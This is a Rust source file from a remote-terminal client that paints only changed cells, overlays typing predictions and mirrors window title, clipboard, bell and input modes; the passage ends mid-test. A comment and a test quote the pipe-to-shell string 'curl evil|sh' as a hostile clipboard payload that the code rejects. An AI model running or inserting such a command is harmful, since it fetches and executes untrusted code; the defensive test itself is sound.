//! Painting the synced grid, the predictions over it and a status line through [`KohBackend`],
//! cell by cell: a frame paints only the cells that changed ([`Painter`]), emits SGR only when the
//! style changes, and is wrapped in synchronized output (DEC 2026) so it shows at once.

use std::io;

use super::backend::{CellStyle, KohBackend};
use crate::predict::Overlay;
use crate::terminal::{Grid, Size, MAXIMUM_CLIPBOARD_SIZE};
use fux_vt::{Cell, Color, MouseProtocolEncoding, MouseProtocolMode};
use unicode_width::UnicodeWidthChar as _;

/// What the terminal was last painted with, so the next frame paints only what changed.
///
/// A frame is painted whole when the terminal may not show what was painted: the first frame, after
/// [`invalidate`](Self::invalidate) (a resume, a window resize), when the screen's size changed,
/// when the status line appears or goes, and while the terminal is smaller than the screen. So is
/// it, and the next one, when a glyph does not fill exactly the cells the grid gives it (a
/// predicted wide glyph over a narrow cell): the terminal then lays the row out its own way.
#[derive(Default)]
pub(super) struct Painter {
    last: Option<Painted>,
}

/// A frame as it was painted.
struct Painted {
    /// The grid; its rows are shared, so keeping it copies no cells.
    grid: Grid,
    /// The predictions drawn over it, in `(row, col)` order.
    predicted: Vec<Mark<String>>,
    status: bool,
    /// Whether the terminal may not show exactly this frame (see [`Painter`]).
    irregular: bool,
}

/// A prediction drawn over a cell: its glyph borrowed while painting, owned once painted.
#[derive(Clone, Copy, PartialEq, Eq)]
struct Mark<G> {
    row: u16,
    col: u16,
    glyph: G,
    fg: Color,
    bg: Color,
}

impl Mark<String> {
    fn borrowed(&self) -> Mark<&str> {
        Mark {
            row: self.row,
            col: self.col,
            glyph: &self.glyph,
            fg: self.fg,
            bg: self.bg,
        }
    }
}

impl Mark<&str> {
    fn owned(self) -> Mark<String> {
        Mark {
            row: self.row,
            col: self.col,
            glyph: self.glyph.to_owned(),
            fg: self.fg,
            bg: self.bg,
        }
    }
}

/// The marks of `marks` (in `(row, col)` order) on `row`.
fn marks_on<'m, 'a>(marks: &'m [Mark<&'a str>], row: u16) -> &'m [Mark<&'a str>] {
    let start = marks.partition_point(|mark| mark.row < row);
    let end = marks.partition_point(|mark| mark.row <= row);
    marks.get(start..end).unwrap_or_default()
}

/// What one cell of a frame draws.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Paint<'a> {
    /// The right half of a wide glyph, which the glyph to its left covers.
    Covered,
    /// `glyph` in `style`, over `span` cells of the grid: 2 for a wide cell, else 1.
    Glyph {
        glyph: &'a str,
        style: CellStyle,
        span: u16,
    },
}

/// The style of a cell drawn with no attribute but its colours.
const fn plain(fg: Color, bg: Color) -> CellStyle {
    CellStyle {
        fg,
        bg,
        bold: false,
        dim: false,
        italic: false,
        underline: false,
        inverse: false,
    }
}

/// What `grid` with the predictions `marks` draws at `(row, col)`.
fn paint<'a>(grid: &'a Grid, marks: &[Mark<&'a str>], row: u16, col: u16) -> Paint<'a> {
    let cell = grid.cell(row, col);
    if cell.is_some_and(Cell::is_wide_continuation) {
        return Paint::Covered;
    }
    let span = if cell.is_some_and(Cell::is_wide) {
        2
    } else {
        1
    };
    // A prediction wins on glyph and colours; an empty glyph is a blank.
    let mark = marks
        .binary_search_by_key(&(row, col), |mark| (mark.row, mark.col))
        .ok()
        .and_then(|at| marks.get(at));
    let (glyph, style) = match (mark, cell) {
        (Some(mark), _) => (mark.glyph, plain(mark.fg, mark.bg)),
        (None, Some(c)) => (
            c.contents(),
            CellStyle {
                fg: c.fgcolor(),
                bg: c.bgcolor(),
                bold: c.bold(),
                dim: c.dim(),
                italic: c.italic(),
                underline: c.underline(),
                inverse: c.inverse(),
            },
        ),
        (None, None) => ("", plain(Color::Default, Color::Default)),
    };
    Paint::Glyph {
        glyph: if glyph.is_empty() { " " } else { glyph },
        style,
        span,
    }
}

/// Whether every glyph `grid` and `marks` draw on `row` fills exactly the cells the grid gives it:
/// one column for a narrow cell, two for a wide one followed by the half it covers.
fn regular(grid: &Grid, marks: &[Mark<&str>], row: u16) -> bool {
    let cols = grid.size().cols;
    let mut col = 0;
    while col < cols {
        let Paint::Glyph { glyph, span, .. } = paint(grid, marks, row, col) else {
            return false; // a half no glyph covers
        };
        let columns = glyph
            .chars()
            .fold(0_usize, |sum, c| sum.saturating_add(c.width().unwrap_or(0)));
        let covers = span == 1
            || col
                .checked_add(1)
                .is_some_and(|next| paint(grid, marks, row, next) == Paint::Covered);
        if columns != usize::from(span) || !covers {
            return false;
        }
        col = col.saturating_add(span);
    }
    true
}

impl Painter {
    /// Forget what was painted: the next frame is painted whole.
    pub(super) fn invalidate(&mut self) {
        self.last = None;
    }

    /// Paint `screen` with the predictions `overlay` and an optional `status` line (reverse video,
    /// on the last row).
    pub(super) fn render(
        &mut self,
        backend: &mut impl KohBackend,
        screen: &Grid,
        overlay: &Overlay<'_>,
        status: Option<&str>,
    ) -> io::Result<()> {
        let Size { rows, cols } = screen.size();
        let marks: Vec<Mark<&str>> = overlay
            .cells()
            .map(|((row, col), p)| Mark {
                row,
                col,
                glyph: p.glyph,
                fg: p.fg,
                bg: p.bg,
            })
            .collect();
        // Only on a terminal holding the whole screen does a cell land where it is painted.
        let fits = backend
            .size()
            .is_ok_and(|terminal| terminal.rows >= rows && terminal.cols >= cols);
        let last = self.last.take().filter(|last| {
            fits && !last.irregular
                && last.grid.size() == screen.size()
                && last.status == status.is_some()
        });
        let last_marks: Vec<Mark<&str>> = last
            .iter()
            .flat_map(|last| &last.predicted)
            .map(Mark::borrowed)
            .collect();
        let status_row = status.map(|_| rows.saturating_sub(1));
        // The rows that differ from the last frame; the status line's row is repainted with it.
        let changed = |row: u16| {
            last.as_ref().is_none_or(|last| {
                Some(row) == status_row
                    || !last.grid.row_eq(screen, row)
                    || marks_on(&last_marks, row) != marks_on(&marks, row)
            })
        };
        let whole = last.is_none()
            || (0..rows)
                .filter(|&row| changed(row))
                .any(|row| !regular(screen, &marks, row));

        backend.begin_frame()?;

        let mut cur_style: Option<CellStyle> = None;
        let mut irregular = false;
        if whole {
            for row in 0..rows {
                irregular = irregular || !regular(screen, &marks, row);
                backend.move_to(row, 0)?;
                for col in 0..cols {
                    if let Paint::Glyph { glyph, style, .. } = paint(screen, &marks, row, col) {
                        if cur_style != Some(style) {
                            backend.set_style(style)?;
                            cur_style = Some(style);
                        }
                        backend.print(glyph)?;
                    }
                }
            }
        } else if let Some(last) = &last {
            // Where the cursor is after the last glyph painted, if known: past the last column the
            // terminal may be about to wrap.
            let mut cursor: Option<(u16, u16)> = None;
            for row in (0..rows).filter(|&row| changed(row)) {
                let repaint_row = Some(row) == status_row;
                let mut col = 0;
                while col < cols {
                    let now = paint(screen, &marks, row, col);
                    let Paint::Glyph { glyph, style, span } = now else {
                        col = col.saturating_add(1);
                        continue;
                    };
                    let before = |col| paint(&last.grid, &last_marks, row, col);
                    // A wide glyph is painted whole when either half of it changed.
                    let differs = repaint_row
                        || now != before(col)
                        || (span == 2
                            && col.checked_add(1).is_some_and(|next| {
                                paint(screen, &marks, row, next) != before(next)
                            }));
                    if differs {
                        if cursor != Some((row, col)) {
                            backend.move_to(row, col)?;
                        }
                        if cur_style != Some(style) {
                            backend.set_style(style)?;
                            cur_style = Some(style);
                        }
                        backend.print(glyph)?;
                        cursor = col
                            .checked_add(span)
                            .filter(|&next| next < cols)
                            .map(|next| (row, next));
                    }
                    col = col.saturating_add(span);
                }
            }
        }

        if cur_style.is_some() {
            backend.reset_sgr()?;
        }

        if let Some(st) = status {
            let mut line = format!(" {st} ");
            let max = usize::from(cols);
            if line.len() > max {
                // On a char boundary: the status holds multi-byte glyphs.
                line.truncate(line.floor_char_boundary(max));
            }
            backend.move_to(rows.saturating_sub(1), 0)?;
            backend.set_reverse()?;
            backend.print(&line)?;
            backend.reset_sgr()?;
        }

        // The predicted cursor wins.
        let (crow, ccol) = overlay.cursor().unwrap_or_else(|| screen.cursor_position());
        backend.move_to(crow, ccol)?;
        if !screen.hide_cursor() {
            backend.show_cursor()?;
        }

        backend.end_frame()?;
        let painted = Painted {
            grid: screen.clone(),
            predicted: marks.into_iter().map(Mark::owned).collect(),
            status: status.is_some(),
            irregular: irregular || !fits,
        };
        self.last = Some(painted);
        backend.flush()
    }
}

/// `t` without control characters, which would break the OSC sequence it goes in.
fn sanitize_osc(t: &str) -> String {
    t.chars().filter(|c| !c.is_control()).collect()
}

/// Whether `s` is non-empty base64, as a clipboard set must be to be forwarded.
fn is_base64_payload(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
}

/// The window state the client mirrors beside the grid: title, icon, clipboard and bell count.
#[derive(Clone, Copy)]
pub struct WindowState<'a> {
    pub title: &'a str,
    pub icon: &'a str,
    pub clipboard: &'a str,
    pub bell_count: u64,
}

/// The input modes the program set, which the real terminal must mirror: keypad and cursor keys,
/// bracketed paste and mouse reporting. The sequences are vt100 0.16's, byte for byte.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub struct InputModes {
    pub application_keypad: bool,
    pub application_cursor: bool,
    pub bracketed_paste: bool,
    pub mouse_mode: MouseProtocolMode,
    pub mouse_encoding: MouseProtocolEncoding,
}

impl From<&Grid> for InputModes {
    fn from(s: &Grid) -> Self {
        let m = s.modes();
        Self {
            application_keypad: m.application_keypad,
            application_cursor: m.application_cursor,
            bracketed_paste: m.bracketed_paste,
            mouse_mode: m.mouse_mode,
            mouse_encoding: m.mouse_encoding,
        }
    }
}

impl InputModes {
    /// Sequences setting every mode (the first frame, after a resume).
    pub fn formatted(self) -> Vec<u8> {
        self.sequences(None)
    }

    /// Sequences taking a terminal at `prev` to these modes.
    pub fn diff(self, prev: Self) -> Vec<u8> {
        self.sequences(Some(prev))
    }

    /// The sequences taking a terminal at `prev` (unknown if `None`) to these modes.
    fn sequences(self, prev: Option<Self>) -> Vec<u8> {
        use MouseProtocolEncoding as Enc;
        use MouseProtocolMode as Mode;
        let mut buf = Vec::new();
        let changed = |get: fn(&Self) -> bool| prev.is_none_or(|p| get(&p) != get(&self));
        if changed(|m| m.application_keypad) {
            buf.extend_from_slice(if self.application_keypad {
                b"\x1b="
            } else {
                b"\x1b>"
            });
        }
        if changed(|m| m.application_cursor) {
            buf.extend_from_slice(if self.application_cursor {
                b"\x1b[?1h"
            } else {
                b"\x1b[?1l"
            });
        }
        if changed(|m| m.bracketed_paste) {
            buf.extend_from_slice(if self.bracketed_paste {
                b"\x1b[?2004h"
            } else {
                b"\x1b[?2004l"
            });
        }
        let prev_mode = prev.map_or(Mode::None, |p| p.mouse_mode);
        if self.mouse_mode != prev_mode {
            match self.mouse_mode {
                Mode::None => buf.extend_from_slice(match prev_mode {
                    Mode::None => b"",
                    Mode::Press => b"\x1b[?9l",
                    Mode::PressRelease => b"\x1b[?1000l",
                    Mode::ButtonMotion => b"\x1b[?1002l",
                    Mode::AnyMotion => b"\x1b[?1003l",
                }),
                Mode::Press => buf.extend_from_slice(b"\x1b[?9h"),
                Mode::PressRelease => buf.extend_from_slice(b"\x1b[?1000h"),
                Mode::ButtonMotion => buf.extend_from_slice(b"\x1b[?1002h"),
                Mode::AnyMotion => buf.extend_from_slice(b"\x1b[?1003h"),
            }
        }
        let prev_enc = prev.map_or(Enc::Default, |p| p.mouse_encoding);
        if self.mouse_encoding != prev_enc {
            match self.mouse_encoding {
                Enc::Default => buf.extend_from_slice(match prev_enc {
                    Enc::Default => b"",
                    Enc::Utf8 => b"\x1b[?1005l",
                    Enc::Sgr => b"\x1b[?1006l",
                }),
                Enc::Utf8 => buf.extend_from_slice(b"\x1b[?1005h"),
                Enc::Sgr => buf.extend_from_slice(b"\x1b[?1006h"),
            }
        }
        buf
    }
}

/// What the client mirrored onto the real terminal beside the grid (title, icon, clipboard, bell,
/// input modes), so each is emitted only when it changes.
#[derive(Default)]
pub(super) struct OutOfBand {
    /// Prepended to the title (and to an icon equal to it), as mosh's `[mosh] `; empty for none.
    title_prefix: String,
    /// Whether the server may set the clipboard (`--clipboard`). Off by default: a hostile server
    /// could swap a copied command for `curl evil|sh`.
    clipboard_enabled: bool,
    /// Whether the program set a title: until then the user's is left alone, after it even a reset
    /// to empty is mirrored (mosh's `title_initialized`).
    title_initialized: bool,
    last_title: String,
    last_icon: String,
    last_clipboard: String,
    last_bell: u64,
    /// Previous frame's input modes, to diff against the current frame.
    prev_modes: Option<InputModes>,
}

impl OutOfBand {
    /// Mirroring that prefixes the title with `title_prefix`.
    pub(super) fn with_title_prefix(title_prefix: String) -> Self {
        Self {
            title_prefix,
            ..Self::default()
        }
    }

    /// Whether the server may set the clipboard.
    #[must_use]
    pub(super) fn with_clipboard(mut self, enabled: bool) -> Self {
        self.clipboard_enabled = enabled;
        self
    }

    /// Forget what was mirrored, so the next [`emit`](Self::emit) re-asserts it all (after a
    /// resume, which reset the terminal).
    pub(super) fn invalidate(&mut self) {
        let prefix = std::mem::take(&mut self.title_prefix);
        let clipboard_enabled = self.clipboard_enabled;
        *self = Self::with_title_prefix(prefix).with_clipboard(clipboard_enabled);
    }

    /// Emit what changed since the last frame, as mosh's `Display::new_frame` does.
    pub(super) fn emit(
        &mut self,
        backend: &mut impl KohBackend,
        modes: InputModes,
        win: WindowState<'_>,
    ) -> io::Result<()> {
        self.emit_window_title(backend, win.title, win.icon)?;
        // Only if opted in, and only base64 within the cap.
        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
            self.last_clipboard = win.clipboard.to_string();
            if !win.clipboard.is_empty()
                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
                && is_base64_payload(win.clipboard)
            {
                backend.set_clipboard(win.clipboard)?;
            }
        }
        // One bell however many rang.
        if win.bell_count > self.last_bell {
            backend.bell()?;
            self.last_bell = win.bell_count;
        }
        let mode_bytes = match self.prev_modes {
            Some(prev) => modes.diff(prev),
            None => modes.formatted(),
        };
        if !mode_bytes.is_empty() {
            backend.write_input_modes(&mode_bytes)?;
        }
        self.prev_modes = Some(modes);
        Ok(())
    }

    /// Title and icon, as mosh emits them: one `]0;` when they are equal, else `]1;` and `]2;`.
    fn emit_window_title(
        &mut self,
        backend: &mut impl KohBackend,
        title: &str,
        icon: &str,
    ) -> io::Result<()> {
        if self.title_initialized {
            if title == self.last_title && icon == self.last_icon {
                return Ok(());
            }
        } else {
            if title.is_empty() && icon.is_empty() {
                return Ok(()); // nothing set yet — don't blank the user's terminal title
            }
            self.title_initialized = true;
        }
        self.last_title = title.to_string();
        self.last_icon = icon.to_string();
        // The icon is prefixed only if equal to the title, which keeps them equal (mosh's
        // `prefix_window_title`).
        let icon_eq_title = icon == title;
        let t = format!("{}{}", self.title_prefix, sanitize_osc(title));
        let ic = if icon_eq_title {
            format!("{}{}", self.title_prefix, sanitize_osc(icon))
        } else {
            sanitize_osc(icon)
        };
        if ic == t {
            backend.set_window_title(&t)
        } else {
            backend.set_window_icon_and_title(&ic, &t)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::client::backend::CaptureBackend;
    use crate::predict::{DisplayPreference, PredictedCell, PredictionEngine};

    fn screen_of(bytes: &[u8]) -> Grid {
        crate::terminal::TerminalScreen::from_bytes(24, 80, bytes)
            .screen()
            .clone()
    }

    /// Render a first frame into a capture backend and return the emitted bytes as a lossy string.
    fn render_to_string(screen: &Grid, overlay: &Overlay<'_>, status: Option<&str>) -> String {
        let mut backend = CaptureBackend::default();
        Painter::default()
            .render(&mut backend, screen, overlay, status)
            .unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    #[test]
    fn renders_authoritative_text_with_escapes() {
        let s = render_to_string(&screen_of(b"hi"), &Overlay::empty(), None);
        assert!(s.contains("hi"), "rendered text missing");
        assert!(s.contains('\x1b'), "expected ANSI escape sequences");
    }

    #[test]
    fn render_wraps_frame_in_synchronized_output() {
        let s = render_to_string(&screen_of(b"x"), &Overlay::empty(), None);
        assert!(
            s.contains("\x1b[?2026h"),
            "frame must begin synchronized output"
        );
        assert!(
            s.contains("\x1b[?2026l"),
            "frame must end synchronized output"
        );
    }

    /// Build a `WindowState` for tests.
    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
        WindowState {
            title,
            icon,
            clipboard,
            bell_count: bell,
        }
    }

    /// Run one `OutOfBand::emit` into a fresh capture backend and return the emitted bytes.
    fn oob_emit(oob: &mut OutOfBand, screen: &Grid, win: WindowState<'_>) -> Vec<u8> {
        let mut backend = CaptureBackend::default();
        oob.emit(&mut backend, InputModes::from(screen), win)
            .unwrap();
        backend.bytes
    }

    #[test]
    fn out_of_band_title_emits_once_and_guards_empty() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");

        // Empty title/icon before the shell sets one: never blank the user's terminal title.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]"),
            "no OSC for an unset title"
        );

        // A real title (icon == title) is emitted as the combined OSC 0.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim - file.rs\x07"));

        // Unchanged → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]0;"));

        // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;\x07"));
    }

    #[test]
    fn out_of_band_splits_icon_and_title() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Distinct icon name + title → ESC]1;<icon> then ESC]2;<title> (mosh).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("\x1b]1;the-icon\x07"), "icon OSC 1, got {s:?}");
        assert!(s.contains("\x1b]2;the title\x07"), "title OSC 2, got {s:?}");
    }

    #[test]
    fn out_of_band_prefixes_title_and_equal_icon() {
        let mut oob = OutOfBand::with_title_prefix("[koh] ".to_string());
        let scr = screen_of(b"");

        // icon == title: the prefix is applied to both, and the combined OSC 0 carries it.
        let buf = oob_emit(&mut oob, &scr, win("vim", "vim", "", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]0;[koh] vim\x07"),
            "combined title is prefixed, got {:?}",
            String::from_utf8_lossy(&buf)
        );

        // icon != title: only the title (OSC 2) is prefixed; the icon (OSC 1) is left untouched,
        // mirroring mosh's prefix_window_title (which preserves equivalence but doesn't prefix a
        // distinct icon name).
        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(
            s.contains("\x1b]1;the-icon\x07"),
            "distinct icon unprefixed, got {s:?}"
        );
        assert!(
            s.contains("\x1b]2;[koh] the title\x07"),
            "title prefixed, got {s:?}"
        );
    }

    #[test]
    fn out_of_band_default_has_no_title_prefix() {
        // The Default constructor (used by tests and the no-prefix opt-out) adds nothing.
        let mut oob = OutOfBand::default();
        let buf = oob_emit(&mut oob, &screen_of(b""), win("vim", "vim", "", 0));
        assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim\x07"));
    }

    #[test]
    fn out_of_band_clipboard_off_by_default_emits_nothing() {
        // A default OutOfBand must NOT forward a server-set clipboard — no OSC 52 reaches the
        // terminal even though the clipboard changed (the user never opted in).
        let mut oob = OutOfBand::default();
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "no OSC-52 without explicit opt-in, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_forwards_clipboard_when_opted_in() {
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(
            String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
            "clipboard OSC 52 forwarded when opted in"
        );
        // Same clipboard again → not re-emitted.
        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
    }

    #[test]
    fn out_of_band_rejects_non_base64_clipboard_even_when_opted_in() {
        // Even with the opt-in on, a non-base64 payload (e.g. raw shell injection) is dropped, not
        // written verbatim to the terminal.
        let mut oob = OutOfBand::default().with_clipboard(true);
        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
        assert!(
            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
            "a non-base64 clipboard payload is rejected, got {:?}",
            String::from_utf8_lossy(&buf)
        );
    }

    #[test]
    fn out_of_band_rings_bell_on_increase_only() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        // Establish the mode baseline (so later emits don't also carry mode bytes).
        let _ = oob_emit(&mut oob, &scr, win("", "", "", 0));

        // No increase → no bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
        assert!(buf.is_empty(), "no bell when the count is unchanged");

        // Count climbs (possibly by more than one) → exactly one bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 3));
        assert_eq!(buf, b"\x07", "one bell on an increase, even if it jumped");
    }

    #[test]
    fn out_of_band_reasserts_input_modes_on_change() {
        let mut oob = OutOfBand::default();
        // Baseline frame in default modes.
        let _ = oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));

        // The remote turns on bracketed paste + mouse reporting → re-asserted to the real terminal.
        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h");
        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("2004"), "bracketed-paste re-asserted, got {s:?}");
        assert!(s.contains("1000"), "mouse reporting re-asserted, got {s:?}");
    }

    #[test]
    fn renders_status_line() {
        let s = render_to_string(&screen_of(b""), &Overlay::empty(), Some("link down"));
        assert!(s.contains("link down"));
    }

    #[test]
    fn status_line_truncation_is_panic_free_across_all_widths() {
        // The peer-controlled (clamped) screen width must never make the multi-byte status
        // line panic via a mid-UTF-8 `String::truncate`. Sweep every width in [MIN_DIM, MAX_DIM]
        // with the real link-down banner (em-dash U+2014 + ellipsis U+2026, whose bytes straddle
        // widths 18/19/30/31) and assert render() never panics.
        use crate::terminal::{MAX_DIM, MIN_DIM};
        let status = "[koh] link down — resuming… 5s";
        for cols in MIN_DIM..=MAX_DIM {
            let screen = crate::terminal::TerminalScreen::from_bytes(MIN_DIM, cols, b"x")
                .screen()
                .clone();
            let mut backend = CaptureBackend::default();
            Painter::default()
                .render(&mut backend, &screen, &Overlay::empty(), Some(status))
                .expect("render must not error or panic at any width");
        }
    }

    /// Paint one frame with `painter` and return the bytes, as a lossy string.
    fn paint_frame(
        painter: &mut Painter,
        screen: &Grid,
        overlay: &Overlay<'_>,
        status: Option<&str>,
    ) -> String {
        let mut backend = CaptureBackend::default();
        painter
            .render(&mut backend, screen, overlay, status)
            .unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    /// The bytes around a frame's cells: open the synchronized frame, then after the cells place
    /// the cursor at the 1-based `cursor`, show it, and close the frame.
    fn framed(cells: &str, cursor: &str) -> String {
        format!("\x1b[?2026h\x1b[?25l{cells}\x1b[{cursor}H\x1b[?25h\x1b[?2026l")
    }

    /// What `set_style` emits for the default style.
    const PLAIN: &str = "\x1b[m\x1b[39m\x1b[49m";

    #[test]
    fn a_second_identical_frame_paints_no_cells() {
        let screen = screen_of(b"hello");
        let mut painter = Painter::default();
        let first = paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert!(first.contains("hello"));
        let second = paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(second, framed("", "1;6"));
    }

    #[test]
    fn one_changed_cell_paints_only_that_cell() {
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen_of(b"hello"), &Overlay::empty(), None);
        let changed = paint_frame(&mut painter, &screen_of(b"hellO"), &Overlay::empty(), None);
        assert_eq!(changed, framed(&format!("\x1b[1;5H{PLAIN}O\x1b[m"), "1;6"));
    }

    #[test]
    fn the_cursor_moves_only_to_reach_a_changed_cell() {
        // Two changed cells either side of an unchanged wide glyph: the second needs a move, and
        // the glyph between them is not painted.
        let mut painter = Painter::default();
        paint_frame(
            &mut painter,
            &screen_of("a日b".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let changed = paint_frame(
            &mut painter,
            &screen_of("c日d".as_bytes()),
            &Overlay::empty(),
            None,
        );
        assert_eq!(
            changed,
            framed(&format!("\x1b[1;1H{PLAIN}c\x1b[1;4Hd\x1b[m"), "1;5")
        );
        // A changed wide glyph is painted whole, and the cell after it follows without a move.
        paint_frame(
            &mut painter,
            &screen_of("日本x".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let changed = paint_frame(
            &mut painter,
            &screen_of("日字y".as_bytes()),
            &Overlay::empty(),
            None,
        );
        assert_eq!(
            changed,
            framed(&format!("\x1b[1;3H{PLAIN}字y\x1b[m"), "1;6")
        );
    }

    #[test]
    fn a_resize_a_resume_or_a_small_terminal_repaints_everything() {
        let screen = screen_of(b"hello");
        let whole = render_to_string(&screen, &Overlay::empty(), None);
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        // A resume (or a window resize) invalidates what was painted.
        painter.invalidate();
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            whole
        );
        // A screen of another size.
        let small = crate::terminal::TerminalScreen::from_bytes(10, 40, b"hello")
            .screen()
            .clone();
        assert_eq!(
            paint_frame(&mut painter, &small, &Overlay::empty(), None),
            render_to_string(&small, &Overlay::empty(), None)
        );
        // A screen larger than the terminal, where cells do not land where they are painted.
        let large = crate::terminal::TerminalScreen::from_bytes(30, 100, b"hello")
            .screen()
            .clone();
        let whole = render_to_string(&large, &Overlay::empty(), None);
        for _ in 0..2 {
            assert_eq!(
                paint_frame(&mut painter, &large, &Overlay::empty(), None),
                whole
            );
        }
    }

    #[test]
    fn the_status_line_appearing_or_going_repaints_everything() {
        let screen = screen_of(b"hello");
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), Some("down")),
            render_to_string(&screen, &Overlay::empty(), Some("down"))
        );
        // While it stays, only its row is repainted, under the new text.
        let again = paint_frame(&mut painter, &screen, &Overlay::empty(), Some("down 2s"));
        assert!(again.contains("\x1b[24;1H") && again.contains(" down 2s "));
        assert!(!again.contains("hello"), "{again:?}");
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            render_to_string(&screen, &Overlay::empty(), None)
        );
    }

    #[test]
    fn a_prediction_is_painted_and_cleared_like_a_cell() {
        let screen = screen_of(b"ab");
        let predicted = Overlay::of(
            [(
                (0, 2),
                PredictedCell {
                    glyph: "Z",
                    fg: Color::Default,
                    bg: Color::Default,
                },
            )],
            Some((0, 3)),
        );
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &predicted, None),
            framed(&format!("\x1b[1;3H{PLAIN}Z\x1b[m"), "1;4")
        );
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            framed(&format!("\x1b[1;3H{PLAIN} \x1b[m"), "1;3")
        );
    }

    #[test]
    fn a_glyph_wider_than_its_cell_repaints_everything_twice() {
        // A predicted wide glyph over a narrow cell: the terminal lays the row out its own way, so
        // that frame and the next are painted whole, as every frame used to be.
        let screen = screen_of(b"ab");
        let wide = Overlay::of(
            [(
                (0, 2),
                PredictedCell {
                    glyph: "世",
                    fg: Color::Default,
                    bg: Color::Default,
                },
            )],
            None,
        );
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &wide, None),
            render_to_string(&screen, &wide, None)
        );
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            render_to_string(&screen, &Overlay::empty(), None)
        );
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            framed("", "1;3")
        );
    }

    /// Output that exercises what a frame can change: text, wide glyphs, combining marks,
    /// colours and attributes, cursor motion, erasing, scrolling and inserting lines, wrapping.
    const PIECES: [&str; 22] = [
        "a",
        "xyz",
        "日",
        "本",
        "é",
        "e\u{301}",
        "\u{1f980}",
        "\r\n",
        "\x1b[31m",
        "\x1b[1;7m",
        "\x1b[44m",
        "\x1b[m",
        "\x1b[H",
        "\x1b[2J",
        "\x1b[3;7H",
        "\x1b[K",
        "\x1b[2L",
        "\x1b[M",
        "\x1b[S",
        "\x1b[19G",
        "\x1b[?25l\x1b[?25h",
        "a line that wraps past the edge",
    ];

    /// Predicted glyphs, one wider than a cell.
    const GLYPHS: [&str; 4] = ["Z", "", "ü", "世"];

    /// Status lines of several lengths.
    const STATUSES: [&str; 3] = [
        "[koh] link down \u{2014} 10s",
        "[koh] link down \u{2014} 9s",
        "x",
    ];

    /// The cells and cursor a terminal shows.
    fn shown(terminal: &fux_vt::Parser) -> (Vec<Option<Cell>>, (u16, u16)) {
        let screen = terminal.screen();
        let (rows, cols) = screen.size();
        let cells = (0..rows)
            .flat_map(|row| (0..cols).map(move |col| (row, col)))
            .map(|(row, col)| screen.cell(row, col).copied())
            .collect();
        (cells, screen.cursor_position())
    }

    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(128))]

        /// A terminal fed only what changed shows, after every frame, exactly what a terminal fed
